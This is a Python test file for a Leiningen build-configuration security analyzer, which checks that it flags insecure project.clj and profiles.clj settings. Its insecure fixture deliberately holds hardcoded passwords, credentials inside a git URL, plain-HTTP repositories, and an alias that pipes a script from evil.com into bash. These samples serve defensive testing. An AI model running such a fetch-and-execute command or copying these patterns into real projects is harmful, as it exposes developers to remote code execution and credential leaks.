"""Tests for LeiningenAnalyzer."""

from pathlib import Path

from devai.leiningen_analyzer import LeiningenAnalyzer, LeiningenFinding


INSECURE_PROJECT_CLJ = """\
(defproject my-app "0.1.0-SNAPSHOT"
  :description "Insecure example"
  :dependencies [[org.clojure/clojure "1.11.1"]
                 [compojure "latest"]
                 [private-lib "1.0.0" :checkout "https://user:pass@github.com/private/deps.git#master"]]
  :repositories [["private" {:url "http://insecure.example.com/maven"
                             :username "deploy"
                             :password "secret-token-12345"}]]
  :deploy-credentials {:username "deploy" :password "hardcoded-secret"}
  :aliases {"setup" ["do" ["shell" "curl http://evil.com/install.sh | bash"]]})
"""

HARDENED_PROJECT_CLJ = """\
(defproject my-app "0.1.0-SNAPSHOT"
  :description "Secure example"
  :dependencies [[org.clojure/clojure "1.11.4"]
                 [compojure "1.7.1"]]
  :repositories [["central" {:url "https://repo1.maven.org/maven2/" :snapshots false}]])
"""


class TestLeiningenAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = LeiningenAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_detects_project_clj(self, tmp_path: Path):
        (tmp_path / "project.clj").write_text(HARDENED_PROJECT_CLJ, encoding="utf-8")
        analyzer = LeiningenAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 1

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "project.clj").write_text(INSECURE_PROJECT_CLJ, encoding="utf-8")
        analyzer = LeiningenAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds or "deploy_credentials" in kinds
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert analyzer.health_score() < 100.0

    def test_hardened_config_has_no_findings(self, tmp_path: Path):
        (tmp_path / "project.clj").write_text(HARDENED_PROJECT_CLJ, encoding="utf-8")
        analyzer = LeiningenAnalyzer(str(tmp_path))
        assert analyzer.stats.findings == 0
        assert analyzer.health_score() == 100.0

    def test_generate_hardened_config(self):
        analyzer = LeiningenAnalyzer(".")
        config = analyzer.generate_hardened_config()
        assert "defproject" in config
        assert "https://" in config

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "project.clj").write_text(INSECURE_PROJECT_CLJ, encoding="utf-8")
        analyzer = LeiningenAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Leiningen analysis:" in context
        assert "health score:" in context

    def test_finding_format(self):
        finding = LeiningenFinding(
            kind="test",
            severity="high",
            message="test message",
            path="project.clj",
            lineno=1,
        )
        assert "[high]" in finding.format()
        assert "project.clj:1" in finding.format()

    def test_detects_profiles_clj(self, tmp_path: Path):
        (tmp_path / "project.clj").write_text(HARDENED_PROJECT_CLJ, encoding="utf-8")
        (tmp_path / "profiles.clj").write_text(
            '[:dev {:env {:api-key "hardcoded-key-12345"}}]\n',
            encoding="utf-8",
        )
        analyzer = LeiningenAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.path == "profiles.clj" for f in findings)
